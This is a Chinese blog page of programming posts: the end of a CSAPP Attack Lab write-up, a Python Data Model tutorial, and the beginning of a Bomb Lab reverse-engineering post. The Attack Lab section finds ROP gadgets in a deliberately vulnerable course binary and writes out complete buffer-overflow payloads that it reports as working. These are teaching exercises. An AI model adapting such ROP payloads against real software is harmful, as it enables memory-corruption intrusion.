<p>字节序列 <code>48 89 c7</code> 编码了指令 <code>movq %rax, %rdi</code>，这个字节序列后面跟着 <code>c3</code>，也就是 <code>ret</code> 指令，它可以让我们跳入下一个 <em>gadget</em>。那么我们就可以利用字节序列的开始地址 <code>0x400f19</code> 还使用指令。</p>
<p>指令的16进制编码可以在下表中查看：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.34.png" alt="Screen Shot 2017-07-09 at 20.20.34"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.54.png" alt="Screen Shot 2017-07-09 at 20.20.54"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.01.png" alt="Screen Shot 2017-07-09 at 20.21.01"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.10.png" alt="Screen Shot 2017-07-09 at 20.21.10"></p>
<p>另外两个指令是：</p>
<ul>
<li><code>ret</code>：字节编码为 <code>0xc3</code></li>
<li><code>nop</code>：让程序计数器加一，什么都不做，字节编码为<code>0x90</code></li>
</ul>
<p>在终端运行命令 <code>objdump -d rtarget &gt; rtarget.txt</code>，以寻找目标代码。<br>现在我们要重复第二阶段的任务：将自己的 cookie 作为参数传入 <code>touch2</code>。我们需要做三步：</p>
<ol>
<li>将 cookie 传入<code>%rdi</code>中</li>
<li>将 <code>touch2</code> 地址放入栈中</li>
<li>执行 <code>touch2</code></li>
</ol>
<p>为了将 cookie 存入 <code>%rdi</code>，最简单的想法是先将 cookie 存入栈中，再从栈中弹出。但是找不到 <code>popq %rdi</code>，只找到了 <code>popq %rax</code>，代码地址为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>所以我们的第一个 <em>gadget</em> 的地址为 <code>0x4019ab</code>。</p>
<p>后面的动作可以用下面的汇编代码完成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax %edi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>其中 <code>movq %rax %edi</code> 的字节码为：<code>48 89 c7 c3</code>。我们可以在下面的代码中找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>所以我们第二个 <em>gadget</em> 的地址为 <code>0x4019c5</code>。</p>
<p>所以我们要构造的文件应该包含三部分，首先是40字节的缓冲区，然后是 <code>gadget1</code> 的地址，cookie，<code>gadget2</code> 的地址，最后是 <code>touch2</code> 的地址。构造 rtarget4.txt 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cc cc cc cc cc cc cc cc cc cc                                                                                           </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00  </span><br><span class="line">c5 19 40 00 00 00 00 00  </span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>我们先生成它的二进制码：<code>.\hex2raw &lt; rtarget4.txt &gt; rtarget4_r.txt</code>。<br>然后执行 <code>.\rtarget -i rtarget4_r.txt -q</code>，得到：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2017.13.01.png" alt="Screen Shot 2017-07-09 at 17.13.01"></p>
<p>成功。</p>
<h2 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h2><p>阶段五的目标和阶段三一样，首先使用 cookie 构造字符串，然后将字符串作为参数传入 <code>touch3</code>。</p>
<p>首先，我们把 cookie 转换成 ascii 码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>我们接下来的思路为：</p>
<ol>
<li>获得 <code>%rsp</code> 的地址</li>
<li>将（栈的起始地址）+（cookie 的偏移量）放入某个寄存器中</li>
<li>将寄存器的值放入 <code>%rdi</code> 中</li>
<li>调用 <code>touch3</code></li>
</ol>
<p>首先，寻找 <code>movq %rsp, %rax</code>, <code>48 89 e0</code>。</p>
<p>我们可以找到如下代码片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>所以 <code>gadget1</code> 的地址为 <code>0x401aad</code>。</p>
<p>接下来，我们需要递增 <code>%rax</code> 的地址，我们可以找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>得 <code>gadget2</code> 的地址为：<code>0x4019d8</code>。</p>
<p>接下来要将 <code>%rax</code> 的内容移动到 <code>%rdi</code> 中，找到 <code>mov %rax, %rdi</code>, <code>48 89 c7</code> 的代码片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>得到 <code>gadget3</code> 的地址为：<code>0x4019a2</code>。</p>
<p>最后，攻击文件应该包括：填充区1，gadget1，gadget2，gadget3，touch3的地址，填充区2，cookie。第二个填充区的大小为55(0x37) - 3 * 8 = 31字节。<code>rtarget5.txt</code> 的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cc cc cc cc cc cc cc cc cc cc                                                                                           </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00  </span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>我们先生成它的二进制码：<code>.\hex2raw &lt; rtarget5.txt &gt; rtarget5_r.txt</code>。<br>然后执行 <code>.\rtarget -i rtarget5_r.txt -q</code>，得到：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2019.58.10.png" alt="Screen Shot 2017-07-09 at 19.58.10"></p>
<p>成功。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验真的加深了我对内存和缓冲区的理解。以前上专业课，所有的知识都停留在书本上，没有做到学以致用。而这次实验，通过汇编、反汇编的、拼凑内存内容的方式直接和操作系统底层打交道，真的很有趣，但是也很要求精确。</p>
<p>现在看看，我们平时用高级语言写与系统无关的代码是一件多么幸福的事情啊。</p>
<p>我觉得学习操作系统，阅读 CSAPP，就是让我能够站在系统工作原理的粒度上理解代码，理解 C 语言和汇编，这种思考方式和视角才是阅读 CSAPP 和完成这些实验之后，我获得的最大的收获。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/05/31/python-data-model/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/05/31/python-data-model/" class="post-title-link" itemprop="url">Python 中的 Data Model</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-05-31 15:13:46" itemprop="dateCreated datePublished" datetime="2017-05-31T15:13:46+08:00">2017-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/programming-language/" itemprop="url" rel="index"><span itemprop="name">编程语言</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/05/31/python-data-model/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/05/31/python-data-model/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="什么是-Data-Model"><a href="#什么是-Data-Model" class="headerlink" title="什么是 Data Model"></a>什么是 Data Model</h2><p>Data Model 简单来说就是对 Python 语言的基本结构的描述。如果将 Python 本身看做一个 Framework，Data Model 就定义了和 Python 的交互方式。</p>
<p>对象（Object）是 Python 对数据的抽象方式，Python 将所有数据都抽象为对象以及对象见的关系。每一个对象都由三部分构成：<code>id</code>、<code>type</code> 和 <code>value</code>。一个对象在被创建后，它的 <code>id</code> 就不会在改变了，我们可以将它当做对象在内存中的地址。<code>is</code> 操作符可以比较两个对象的是否有相同的 <code>id</code>，<code>id()</code> 函数将返回对象地址的整数表示。</p>
<p>对象的 <code>type</code> 决定了对象支持哪些操作，以及该类型对象可能持有的值。<code>type()</code> 函数返回一个对象的类型，和 <code>id</code> 一样，一个对象的类型是<em>不可改变</em>的。</p>
<p>如果一个对象的 <code>value</code> 是可变的，那么这个对象就是可变的（mutable）；如果对象的 <code>value</code> 是不可变的，那么这个对象也就是不可变的（immutable）。如果一个不可变的容器对象包含了可变对象的引用，那么虽然引用所指向的对象可以被改变，但是该容器仍然被认为是不可变的，因为它包含的引用并没有改变。一个对象的可变性（mutability）由该对象的 <code>type</code> 决定。比如，数字，字符串和 tuple 都是不可变对象，而字典和集合是可变对象。</p>
<p>Python 是一种公认的易用的语言，我们可以很容易的考猜测或者直觉来正确使用它的功能。但是在刚开始使用 Python 的时候，我们可能会奇怪，为什么我们要使用 <code>len(array)</code> 而不是 <code>array.len()</code> 来得到一个数组的长度呢？这里的原因就在于 Python 的 Data Model。Data Model 描述了我们与 Python 的交互方式，它通过特殊的语法来调用定义在对象上的魔法方法（Magic Method）。魔法方法通常在方法名的首位都添加 <code>__</code>，例如 <code>__getitem__</code>。当我们通过下标来访问对象时，<code>obj[key]</code>，解析器实际上回去调用 <code>obj.__getitem__(key)</code>。我们通过重定义对象中的魔法方法来与 Python 中的基础设施（Iteration Collection，etc）交互。</p>
<h2 id="Pythonic-Card-Deck"><a href="#Pythonic-Card-Deck" class="headerlink" title="Pythonic Card Deck"></a>Pythonic Card Deck</h2><p>下面，我们通过一个简单的例子来演示实现 <code>__getitem__</code> 和 <code>__len__</code> 之后类的功能。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line">Card = collections.namedtuple(<span class="string">"Card"</span>, [<span class="string">"rank"</span>, <span class="string">"suit"</span>])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FrenchDeck</span>:</span></span><br><span class="line">    ranks = [str(n) <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">11</span>)] + list(<span class="string">"JQKA"</span>)</span><br><span class="line">    suits = <span class="string">"spades diamonds clubs hearts"</span>.split()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._cards = [Card(rank, suit) <span class="keyword">for</span> suit <span class="keyword">in</span> self.suits</span><br><span class="line">                                        <span class="keyword">for</span> rank <span class="keyword">in</span> self.ranks]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self._cards)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, position)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._cards[position]</span><br></pre></td></tr></table></figure>

<p>上面的代码中我们使用 namedtuple 在表示一张牌，用 <code>FrenchDeck</code> 类来代表一副牌。我们可以将它的实例传入 <code>len()</code> 在得到一共有多少张牌：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>deck = FrenchDeck()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(deck)</span><br><span class="line"><span class="number">52</span></span><br></pre></td></tr></table></figure>

<p>我们也可以直接通过下标来访问某一张牌，使用通过实现 <code>__getitem__</code> 来使类拥有的能力：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>deck[<span class="number">0</span>]</span><br><span class="line">Card(rank=<span class="string">'2'</span>, suit=<span class="string">'spades'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>deck[<span class="number">-1</span>]</span><br><span class="line">Card(rank=<span class="string">'A'</span>, suit=<span class="string">'hearts'</span>)</span><br></pre></td></tr></table></figure>

<p>因为我们在 <code>__getitem__</code> 中使用了 <code>self._card</code> 的 <code>[]</code> 操作，所以，我们的类也可以直接获得切片的功能：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>deck[:<span class="number">3</span>]</span><br><span class="line">[Card(rank=<span class="string">'2'</span>, suit=<span class="string">'spades'</span>), Card(rank=<span class="string">'3'</span>, suit=<span class="string">'spades'</span>), Card(rank=<span class="string">'4'</span>, suit=<span class="string">'spades'</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>deck[<span class="number">12</span>::<span class="number">13</span>]</span><br><span class="line">[Card(rank=<span class="string">'A'</span>, suit=<span class="string">'spades'</span>), Card(rank=<span class="string">'A'</span>, suit=<span class="string">'diamonds'</span>), Card(rank=<span class="string">'A'</span>, suit=<span class="string">'clubs'</span>), Card(rank=<span class="string">'A'</span>, suit=<span class="string">'hearts'</span>)]</span><br></pre></td></tr></table></figure>

<p>在实现了 <code>__getitem__</code> 之后，我们的类也是可遍历的（iterable）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> card <span class="keyword">in</span> deck:</span><br><span class="line"><span class="meta">... </span>    print(card)</span><br><span class="line">...</span><br><span class="line">Card(rank=<span class="string">'2'</span>, suit=<span class="string">'spades'</span>)</span><br><span class="line">Card(rank=<span class="string">'3'</span>, suit=<span class="string">'spades'</span>)</span><br><span class="line">Card(rank=<span class="string">'4'</span>, suit=<span class="string">'spades'</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>遍历也可以是隐式的，如果一个集合没有实现 <code>__contains__</code> 方法，<code>in</code> 操作就是做顺序扫描：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Card(<span class="string">'Q'</span>, <span class="string">"hearts"</span>) <span class="keyword">in</span> deck</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Card(<span class="string">'7'</span>, <span class="string">"beats"</span>) <span class="keyword">in</span> deck</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>我们可以与标准库交互来随机选择一张牌，<code>random.choice</code>可以从一个序列中随机选择一个元素：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>choice(deck)</span><br><span class="line">Card(rank=<span class="string">'K'</span>, suit=<span class="string">'hearts'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>choice(deck)</span><br><span class="line">Card(rank=<span class="string">'J'</span>, suit=<span class="string">'spades'</span>)</span><br></pre></td></tr></table></figure>

<p>通过上面的例子我们可以看到，实现魔法方法有两个好处：</p>
<ol>
<li>类的用户不需要去记忆标准操作的方法名。比如，要得到序列中元素的个数，可直接使用 <code>len(s)</code>，而不需要记忆应该使用 <code>.size()</code> 还是 <code>.length()</code>。</li>
<li>可以更容易地与 Python 标准库协作，从而避免重新发明轮子。</li>
</ol>
<p>通过实现魔法方法，我们的类的行为很像一个标准的 Python 序列，可以使我们的类获得与语言核心交互的能力（如：迭代和切片）。</p>
<h2 id="魔法方法的工作方式"><a href="#魔法方法的工作方式" class="headerlink" title="魔法方法的工作方式"></a>魔法方法的工作方式</h2><p>通常，魔法方法是由解析器来调用的而不是用户，除非用户在做元编程（meta programming）。但是对于內建的类型如 list，str，bytearray 等，解析器并不会去数元素的个数。在 CPython 的实现中，<code>len()</code> 会之间返回 C 语言结构体 <code>PyVarObject</code> 中 <code>ob_size</code> 的值，这个值代表了内存中对象的大小。</p>
<p>魔法方法的被调用过程是隐式的。例如，当我们使用 <code>for i in x</code> 时，会导致调用 <code>iter(x)</code>，再调用 <code>x.__iter__()</code>。用户唯一可能会需要经常直接调用的魔法方法是 <code>__init__</code>，在作为类的初始化方法。</p>
<p>如果要实现一个魔法方法，通常通过调用內建的方法来实现是更好的选择，应为內建方法可以提供额外的功能而且速度往往更快。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Data Model 是对 Python 语言的基本结构的描述，定义了內建或自定义类型与语言的交互方式。我们可以通过实现魔法方法来充分利用 Python 提供的功能，构建强大的类型。</p>
<p>完整的魔法方法列表见：<a href="https://docs.python.org/3/reference/datamodel.html" target="_blank" rel="noopener">Data Model</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/04/17/csapp-bomblab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/17/csapp-bomblab/" class="post-title-link" itemprop="url">【深入理解计算机系统实验笔记】| Bomb Lab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-04-17 21:00:23" itemprop="dateCreated datePublished" datetime="2017-04-17T21:00:23+08:00">2017-04-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/04/17/csapp-bomblab/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/04/17/csapp-bomblab/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我阅读 CSAPP 的速度非常慢，因为希望自己能够真正「深入理解」操作系统。这周末，我终于磕磕绊绊地完成了 Bomb Lab，实验过程中主要涉及到阅读汇编代码和 GDB 调试器的使用，还有就是需要一点耐心去分析汇编。</p>
<h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>Bomb Lab 的实验目标主要是要求对一个二进制文件进行逆向工程。这个二进制文件名叫 bomb，要求你输入七个密码，如果输入不符合要求的话，「炸弹」就会被引爆。所以目标就是要求通过分析二进制文件的汇编代码来得到这七个密码。</p>
<p>对获得 bomb 的汇编表示，我们需要使用 objdump 工具执行一条简单的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.s</span><br></pre></td></tr></table></figure>

<p>点开 bomb.s 乍一看会被吓到，什么鬼！但仔细分析会发现一些线索，比如程序的起点<code>main</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br></pre></td></tr></table></figure>

<p>分析 <code>main</code> 的内容我们可以敏锐地发现「拆弹」密码对应的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e37:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">  400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br><span class="line">  400e49:	e8 c2 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e4e:	e8 4b 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e53:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400e56:	e8 a1 00 00 00       	callq  400efc &lt;phase_2&gt;</span><br><span class="line">  400e5b:	e8 64 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e60:	bf ed 22 40 00       	mov    $0x4022ed,%edi</span><br><span class="line">  400e65:	e8 a6 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e6a:	e8 2f 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e6f:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400e72:	e8 cc 00 00 00       	callq  400f43 &lt;phase_3&gt;</span><br><span class="line">  400e77:	e8 48 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e7c:	bf 0b 23 40 00       	mov    $0x40230b,%edi</span><br><span class="line">  400e81:	e8 8a fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e86:	e8 13 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e8b:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400e8e:	e8 79 01 00 00       	callq  40100c &lt;phase_4&gt;</span><br><span class="line">  400e93:	e8 2c 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e98:	bf d8 23 40 00       	mov    $0x4023d8,%edi</span><br><span class="line">  400e9d:	e8 6e fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400ea2:	e8 f7 05 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  400ea7:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400eaa:	e8 b3 01 00 00       	callq  401062 &lt;phase_5&gt;</span><br><span class="line">  400eaf:	e8 10 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400eb4:	bf 1a 23 40 00       	mov    $0x40231a,%edi</span><br><span class="line">  400eb9:	e8 52 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400ebe:	e8 db 05 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  400ec3:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400ec6:	e8 29 02 00 00       	callq  4010f4 &lt;phase_6&gt;</span><br><span class="line">  400ecb:	e8 f4 06 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400ed0:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ed5:	5b                   	pop    %rbx</span><br></pre></td></tr></table></figure>

<p>6 个密码分别对应了 <code>phase_1</code> 到 <code>phase_6</code>，这样，我们的目标就可以具体到分析这些函数。</p>
<h2 id="关卡-1"><a href="#关卡-1" class="headerlink" title="关卡 1"></a>关卡 1</h2><p><code>phase_1</code> 的汇编代码很简单：</p>
